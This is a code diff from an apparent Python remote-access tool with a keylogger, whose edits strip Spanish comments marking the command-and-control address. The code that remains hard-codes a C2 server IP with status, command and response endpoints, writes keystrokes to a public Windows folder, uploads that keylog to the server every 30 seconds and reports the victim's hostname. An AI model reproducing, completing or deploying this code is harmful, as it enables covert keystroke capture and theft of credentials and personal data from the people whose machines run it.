@@ -40,14 +40,14 @@ if not success:
 hostname = buffer.value
 
 
-BASE_URL = "http://54.227.92.142/" # <----------- TU IP DE C2
+BASE_URL = "http://54.227.92.142/"
 STATUS_ENDPOINT = f"{BASE_URL}/status"
 COMMANDER_ENDPOINT = f"{BASE_URL}/Comander"
 RESPONSES_ENDPOINT = f"{BASE_URL}/Responses"
 
 
 KEYLOG_PATH = r"C:\Users\Public\Downloads\keyloge.txt"
-KEYLOG_UPLOAD_URL = "http://54.227.92.142/uploads" # <----------- TU IP DE C2
+KEYLOG_UPLOAD_URL = "http://54.227.92.142/uploads"
 KEYLOG_INTERVAL_SECS = 30 
 
 try:
@@ -83,9 +83,7 @@ def send_form(url, fields):
 def powershell_escape_single_quotes(s: str) -> str:
     return s.replace("'", "''")
 
-# =======================
-#  HILO: Uploader Keylog
-# =======================
+
 def keylog_uploader_loop(file_path: str, upload_url: str, interval_secs: int):
     """
     Cada 'interval_secs':
@@ -150,9 +148,7 @@ def keylog_uploader_loop(file_path: str, upload_url: str, interval_secs: int):
 
         time.sleep(interval_secs)
 
-# =======================
-#   MAIN LOOP (tuyo)
-# =======================
+
 def main_loop():
     print(f"[INFO] Enviando hostname '{hostname}' a {STATUS_ENDPOINT}")
     resp = send_form(STATUS_ENDPOINT, {"machine": hostname})
